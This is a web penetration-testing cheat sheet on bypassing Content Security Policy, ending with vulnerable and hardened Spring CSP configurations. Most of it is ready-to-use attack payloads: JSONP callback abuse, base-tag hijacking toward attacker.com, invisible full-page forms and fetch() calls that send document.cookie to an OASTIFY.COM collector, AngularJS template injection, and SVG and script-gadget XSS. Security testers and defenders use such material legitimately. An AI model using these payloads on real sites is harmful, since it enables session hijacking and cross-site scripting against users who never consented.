Bypass tactic: Defense Evasion

**CSP** is a browser security mechanism that restricts which resources a page can load and execute primarily to mitigate XSS. A well configured CSP can make XSS unexploitable even when injection exists. Understanding CSP bypass techniques is essential because a CSP is often the last line of defence between an XSS injection point and full exploitation.

```
Server sets:  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.com

Browser enforces:
  → blocks inline scripts unless 'unsafe-inline' or nonce is present
  → blocks scripts from any domain not explicitly listed
  → blocks eval() unless 'unsafe-eval' is listed
```

## Key Directives

|Directive|Controls|
|---|---|
|`default-src`|Fallback for all resource types not explicitly listed|
|`script-src`|Which scripts can execute (inline, external, eval)|
|`style-src`|Which stylesheets can load|
|`img-src`|Which image sources are allowed|
|`connect-src`|XHR, Fetch, WebSocket destinations|
|`frame-ancestors`|Who can embed this page in an iframe (replaces X-Frame-Options)|
|`form-action`|Where forms can submit to|
|`base-uri`|Restricts `<base href>` — missing = base tag injection possible|
|`object-src`|`<object>`, `<embed>`, `<applet>` — should always be `'none'`|
|`sandbox`|Restricts iframe capabilities|

---

## Checklist

### Analyse the CSP First

- [ ]  Use **CSP Evaluator**: `https://csp-evaluator.withgoogle.com/`
- [ ]  Check for these dangerous values in `script-src`:

```
	'unsafe-inline'          → inline scripts allowed → XSS works directly
	'unsafe-eval'            → eval() allowed → JS template injection works
	*                        → wildcard → load scripts from anywhere
	data:                    → data URI scripts allowed
	https:                   → all HTTPS sources allowed
```

- [ ]  Check if `object-src` is missing or set to `*` — allows Flash/plugin-based bypass
- [ ]  Check if `base-uri` is missing — base tag injection possible
- [ ]  Check if `form-action` is missing — form injection exfil possible
- [ ]  Check if any whitelisted domain hosts user-controlled content (JSONP, open redirects, uploads)

### Bypass via Whitelisted Domain

- [ ]  If a CDN or third-party is whitelisted, check if it hosts content you can control:

```
	script-src 'self' https://www.google.com
```

```
Google hosts JSONP endpoints:
```

```html
	<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

- [ ]  Check whitelisted domains for:

```
	JSONP endpoints      → call arbitrary JS function
	Angular CDN          → AngularJS sandbox escape if ng-app is on page
	Open redirects       → redirect to attacker-controlled script
	User upload endpoints → upload a JS file, load it from the whitelisted CDN
```

### Bypass via Nonce

- [ ]  If `script-src` uses a nonce (`'nonce-abc123'`), check if:
    - The nonce is static (same across requests) → reusable
    - The nonce is reflected in the page before the injected script → steal and reuse it
    - The nonce is predictable (timestamp, sequential) → generate next value

### Bypass via `'unsafe-inline'` + Hash Conflict

- [ ]  If `'unsafe-inline'` is present alongside a nonce/hash (nonce overrides inline in CSP3), check browser version compatibility

### Bypass via `base-uri` Missing

- [ ]  If `base-uri` is not set, inject a `<base>` tag to redirect relative script loads to your server:

```html
	<base href="https://attacker.com/">
```

```
Any relative `<script src="utils.js">` now loads from `attacker.com/utils.js`
```

### Bypass via `form-action` Missing

- [ ]  Even when `script-src` is solid, if `form-action` is not set, inject a form that submits to your server:

```html
	<form action="https://OASTIFY.COM" method="POST">
	    <input name="data" value="steal this">
	</form>
```

- [ ]  Make the submit button invisible and cover the entire page with CSS to trigger on any click:

```html
	<form action="https://OASTIFY.COM" method="POST" id="f">
	    <input type="hidden" name="cookie" id="c">
	</form>
	<style>
	    #f { position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999; }
	    input[type=submit] { opacity:0; width:100%; height:100%; cursor:pointer; }
	</style>
	<script>
	    document.getElementById('c').value = document.cookie;
	</script>
	<input type="submit" form="f" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;">
```

- [ ]  Or trigger form submission programmatically:

```javascript
	document.getElementById('f').submit();
```

### Bypass via `connect-src` Missing / Permissive

- [ ]  If `script-src` blocks inline scripts but `connect-src` is missing or allows external, use a script that was loaded legitimately to exfiltrate:

```javascript
	// from within a whitelisted script context
	fetch('https://OASTIFY.COM?d=' + btoa(document.cookie));
```

### Bypass via AngularJS (ng-app on page)

- [ ]  If AngularJS is whitelisted and `ng-app` is on the page, template injection bypasses CSP:

```javascript
	{{constructor.constructor('alert(1)')()}}
```

### Bypass via SVG / data URI (if img-src allows data:)

- [ ]  Load a script from an SVG:

```html
	<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
```

### Bypass via Script Gadget (no external load needed)

- [ ]  If a JS library on the page has a DOM gadget that can be triggered by HTML injection alone  no new script load needed:

```html
	<!-- jQuery -->
	<div data-toggle="modal" data-target="<img src=x onerror=alert(1)>">

	<!-- Bootstrap tooltip -->
	<a data-toggle="tooltip" title="<script>alert(1)</script>">
```

---

## CSP Bypass Payloads

**JSONP bypass via whitelisted Google domain:**

```html
<script src="https://www.google.com/complete/search?client=chrome&q=1&callback=alert"></script>
```

**base-uri injection to hijack relative scripts:**

```html
<base href="https://attacker.com/">
```

**form-action exfil with invisible full-page form:**

```html
<form action="https://OASTIFY.COM" method="GET" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999">
<input name="c" value="">
<input type="submit" style="width:100%;height:100%">
</form>
<script>document.forms[0].c.value=document.cookie;</script>
```

**AngularJS CSP bypass:**

```
{{constructor.constructor('fetch("https://OASTIFY.COM?c="+document.cookie)')()}}
```

---

## White Box Testing

**Vulnerable, CSP missing form-action — form injection exfil possible despite script-src:**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            // script-src is locked down but form-action is missing
            // attacker can inject a form that POSTs to their server
            "default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'"
        ))
    );
    return http.build();
}
```

**Vulnerable, base-uri missing — base tag injection hijacks relative script loads:**

```java
// CSP set without base-uri restriction
"default-src 'self'; script-src 'self'; style-src 'self'"
// missing: base-uri 'self'
// attacker injects <base href="https://attacker.com/"> → all relative scripts load from attacker
```

**Vulnerable, overly permissive script-src whitelists a JSONP-capable domain:**

```java
"script-src 'self' https://www.google.com https://ajax.googleapis.com"
// google.com and googleapis.com host JSONP endpoints
// attacker loads: <script src="https://www.google.com/complete/search?callback=alert">
```

**Secure:**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives(
            "default-src 'self'; "
            + "script-src 'self' 'nonce-{RANDOM_PER_REQUEST}'; "  // per-request nonce
            + "style-src 'self'; "
            + "img-src 'self' data:; "
            + "object-src 'none'; "           // block plugins
            + "base-uri 'self'; "             // block base tag injection
            + "form-action 'self'; "          // block form exfil to external domains
            + "frame-ancestors 'none'; "      // block clickjacking
            + "connect-src 'self'; "          // restrict XHR/Fetch destinations
            + "upgrade-insecure-requests"
        ))
    );
    return http.build();
}

// Generate a fresh nonce per request and inject into the template
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                     FilterChain chain) throws IOException, ServletException {
        byte[] nonce = new byte[16];
        new SecureRandom().nextBytes(nonce);
        String nonceValue = Base64.getEncoder().encodeToString(nonce);
        req.setAttribute("cspNonce", nonceValue);

        // dynamically set CSP header with this request's nonce
        res.setHeader("Content-Security-Policy",
            "script-src 'self' 'nonce-" + nonceValue + "'; ...");
        chain.doFilter(req, res);
    }
}
// In Thymeleaf: <script th:attr="nonce=${cspNonce}">
```

---

## Resources

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [PortSwigger CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [form-action CSP Bypass](https://nzt-48.org/form-action-content-security-policy-bypass-and-other-tactics-for-dealing-with-the-csp)
- [CSP Bypass Techniques — HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
- [CSP Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)